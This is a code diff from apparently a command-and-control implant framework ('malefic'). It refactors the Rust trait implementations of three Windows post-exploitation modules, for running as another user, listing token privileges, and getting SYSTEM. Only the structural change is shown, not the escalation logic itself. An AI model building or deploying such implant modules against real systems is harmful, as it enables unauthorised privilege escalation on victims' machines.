@@ -1,4 +1,4 @@
-use crate::{Module, TaskResult, Result, Input, Output, check_request, check_field};
+use crate::{check_field, check_request, Input, Module, ModuleImpl, Output, Result, TaskResult};
 use malefic_proto::proto::implantpb::{spite::Body};
 use async_trait::async_trait;
 use malefic_trait::module_impl;
@@ -8,7 +8,10 @@ pub struct RunAs {}
 
 #[async_trait]
 #[module_impl("runas")]
-impl Module for RunAs {
+impl Module for RunAs {}
+
+#[async_trait]
+impl ModuleImpl for RunAs {
     async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
         let req = check_request!(receiver, Body::RunasRequest)?;
         
@@ -30,7 +33,9 @@ pub struct GetPriv {}
 
 #[async_trait]
 #[module_impl("privs")]
-impl Module for GetPriv {
+impl Module for GetPriv {}
+#[async_trait]
+impl ModuleImpl for GetPriv {
     async fn run(&mut self, id: u32, _receiver: &mut Input, _sender: &mut Output) -> Result {
         // 调用 get_privs 函数，获取权限列表
         let privileges = malefic_helper::win::token::get_privs()?;
@@ -53,7 +58,10 @@ pub struct GetSystem {}
 
 #[async_trait]
 #[module_impl("getsystem")]
-impl Module for GetSystem {
+impl Module for GetSystem {}
+
+#[async_trait]
+impl ModuleImpl for GetSystem {
     async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
         let req = check_request!(receiver, Body::Getsystem)?;
 
